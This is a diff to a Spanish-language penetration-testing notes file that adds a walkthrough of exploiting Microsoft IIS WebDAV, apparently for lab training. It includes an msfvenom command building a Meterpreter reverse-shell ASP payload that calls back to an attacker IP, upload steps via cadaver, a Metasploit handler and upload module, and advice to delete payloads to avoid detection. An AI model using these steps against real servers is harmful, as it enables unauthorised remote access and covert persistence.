@@ -6442,9 +6442,6 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 </br>
 
 
-<h2> :arrow_right: Windows </h2>
-
-
 </br>
 
 
@@ -6462,7 +6459,7 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 
 
 
-<h3> :radio_button: Tipos de vulnerabilidades de Windows </h3>
+<h3> :radio_button: Protocolos y servicios mas explotados de Windows </h3>
 
 
 
@@ -6474,15 +6471,12 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 
 
 
-
-
-
 <h2> :white_check_mark: Explotación de vulnerabilidades de Windows </h2>
 
 
 <!----------------------------------------------------------------------------- ## Explotación de Microsoft IIS WebDAV ------------------------------------------------------------------------------------------------------------------>
 
-
+</br>
 
 <h2> :white_check_mark: Explotación de Microsoft IIS WebDAV </h2>
 
@@ -6504,7 +6498,41 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 <p> Para conectarse a un servidor WebDav, debera proporcionar credenciales legitimas, esto se debe a que WebDav implementa autenticaion en forma de usuario y contraseña </p>
 
 
-<h3> :radio_button: Pasos </h3>
+
+<h3><b> Impactos de Seguridad Clave: </b></h3>
+
+
+
+<p><b> 1. Ejecución Remota de Código (RCE): </b></p>
+
+<p> &nbsp; • Versiones vulnerables permiten ejecutar comandos arbitrarios vía solicitudes DAV maliciosas</p>
+<p> &nbsp; • Atacantes pueden ejecutar comandos como SYSTEM o servicio de red</p>
+
+<p><b> 2. Escalada de Privilegios: </b></p>
+
+<p> &nbsp; • A menudo se ejecuta con altos privilegios (SYSTEM)</p>
+<p> &nbsp; • Puede aprovechar configuraciones incorrectas para escalar acceso</p>
+
+<p><b> 3. Exfiltración de Datos: </b></p>
+
+<p> &nbsp; • Acceso directo al sistema de archivos permite leer archivos sensibles</p>
+<p> &nbsp; • Puede exfiltrar credenciales, archivos de configuración, etc.}</p>
+
+<p><b> 4. Mecanismos de Persistencia:  </b></p>
+
+<p> &nbsp; • Crea backdoors a través de shells web o tareas programadas</p>
+<p> &nbsp; • Modifica claves del registro para persistir</p>
+
+<p><b> 5.Movimiento Lateral: </b></p>
+
+<p> &nbsp; • Servidor comprometido se convierte en punto pivote a redes internas</p>
+<p> &nbsp; • Credenciales almacenadas en servidor pueden permitir acceso a otros sistemas</p>
+
+
+
+
+
+<h3> :radio_button: Pasos para su explotacion </h3>
 
 
 <p> 1. Validar si el servicio se encuentra corriendo  </p>
@@ -6614,7 +6642,7 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 <p>4. Cargue una puerta trasera .asp en la máquina de destino al directorio /webdav usando la utilidad <b>cadaver</b></p>
 
 
-<p>Cadaver es un cliente de línea de comandos para el protocolo WebDAV, diseñado para interactuar con servidores WebDAV de forma similar a como lo harías con un cliente FTP.</p>
+<p><b>Cadaver es un cliente de línea de comandos para el protocolo WebDAV, diseñado para interactuar con servidores WebDAV de forma similar a como lo harías con un cliente FTP.</b></p>
 
 
 <p align="center">
@@ -6675,38 +6703,173 @@ Cuando el servidor RDP procesa ciertos paquetes del protocolo de enlace inicial 
 
 
 
+<h3><b> Mitigacion </b></h3>
+
+
+
+<p> &nbsp; • Aplicar parches (MS17-010) </p>
+<p> &nbsp; • Deshabilitar WebDAV si no es necesario </p> 
+<p> &nbsp; • Implementar reglas WAF para patrones específicos de WebDAV </p>
+<p> &nbsp; • Monitorear operaciones WebDAV inusuales </p>
+
+
+<h2> :white_check_mark: Explotación WebDAV con Metasploit </h2>
+
+
+<h3><b> :radio_button: Tecnicas </b></h3>
+
+
+<p> Generar la carga util de ASP. con MSF Venom </p>
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/fyYjjQfz/tools-msfvenom.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> MSF Venom es una herramienta de generación de payloads que forma parte del marco Metasploit Framework (MSF). Se utiliza principalmente para crear payloads personalizados que pueden ser ejecutados en sistemas objetivo durante un ataque de penetración. </p>
+
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/qRXYZpg5/316.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.2 LPORT=1234 -f asp > shell.asp </p>
+
+
+<p> -p windows/meterpreter/reverse_tcp: Especifica el payload a usar, en este caso un Meterpreter reverse TCP. </p>
+
+<p> LHOST=10.10.39.2: Define la dirección IP del atacante donde se recibirá la conexión reversa. </p>
+
+<p> LPORT=1234: Define el puerto del atacante donde se recibirá la conexión reversa. </p>
+
+<p>  -f asp: Especifica el formato del payload como ASP (Active Server Pages). </p>
+
+<p> > shell.asp: Redirige la salida del payload al archivo shell.asp. </p>
+
+
+<p> El payload generado será un script ASP que, cuando se ejecute en el sistema objetivo, establecerá una conexión TCP reversa al atacante en la IP 10.10.39.2 y puerto 1234, permitiendo la ejecución de comandos en el sistema objetivo. </p>
+
+
+
+<p> Se recomienda usar carga util meterpreter de 32 bits ya que funcionaria independientemente si el sistema es de 32 o 64 bits  </p>
+
+
+
+<p> 2. Usar Cadaver especificando la URL y la carpeta destino, ingresar usuario y contraseña, lo que nos permitira enumerar los archivos  </p>
+
+
+<p> 3. Con el metodo PUT actualizamos la informacion  </p>
+
+
+ <p align="center">
+
+  <img src="https://i.postimg.cc/BZhxrjDY/317.png" alt="Descripción de la imagen">
+  
+</p>
+
+<p align="center">
+
+  <img src="ttps://i.postimg.cc/LsMftLK5/318.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> 4. configurar un oyente que recibira la conexion inversa del actual sistema de destino  </p>
+
+
+<p> Iniciar Metasploit  </p>
+
+<p> usar <b> Multi/handler (es un módulo en Metasploit que permite gestionar múltiples conexiones simultáneas desde diferentes payloads. Es especialmente útil en escenarios donde se desea interactuar con múltiples sistemas objetivo o cuando se necesita manejar varios payloads a la vez. Actúa como un listener central que puede aceptar conexiones de diversos payloads, como meterpreter, shell reversa, etc., y proporciona una interfaz única para interactuar con todas ellas.) </b> </p>
+
+
+<p> Usar el mismo payload que se habia especificado para generar el archivo ASP <b> "windows/meterpreter/reverse_tcp" </b></p>
+<p> terminar de configurar los parametros como LHOST y RPORT</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/q7xNTFth/319.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p> Cada vez que se ejecute en el objetivo se conectara nuevamente a este controlado TCP inverso</p>
+
+
+<p> Al hacer click en shell_prueba.asp se puede observar que se esta ejecutando por tal motivo se obtuvo acceso con exito al sistema destino</p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/WbSqFzsc/320.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hjFXW71D/321.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+
+
+<p> En la tecnica manual se recomienta una vez se haya obtenido acceso al sistema destino emininar cualquiere carga util "Metodos http DELETE", con el fin de ser lo mas clandestino posible </p>
 
 
 
 
 
+<h3><b> :radio_button: Tecnicas 2 </b></h3>
+
+
+<p> Automatizar todo el proceso utilizando un modulo del marco de metasploit </p>
+
+
+<p> 1. search iis upload </p>
+<p> 2. Seleccionar el modulo adecuado "exploit/windows/iis/iis_webdav_upload_asp "</p>
+
+<p> Este módulo se puede usar para ejecutar una carga útil en servidores IIS que tengan directorios con permisos de escritura para todos los usuarios. La carga útil se sube como un script ASP mediante una solicitud WebDAV PUT. La máquina IIS de destino debe cumplir estas condiciones para ser considerada como vulnerable: permitir el acceso a recursos de script, permisos de lectura y escritura, y ser compatible con ASP.</p>
 
 
 
+<p align="center">
+
+  <img src="https://i.postimg.cc/vZkBf6kM/322.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p align="center">
+
+  <img src="hhttps://i.postimg.cc/XvLztwbw/323.png" alt="Descripción de la imagen">
+  
+</p>
 
 
 
+<p> Una vez que se autentica con exito va a cargar la carga util y luego renombrara el archivo ASP. donde luego lo ejecutara y eliminara la carga util de metasploit.assp para evitar ser detectado </p>
 
 
 
+<p align="center">
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <img src="https://i.postimg.cc/Jz1gx6wB/324.png" alt="Descripción de la imagen">
+  
+</p>
 
 
 
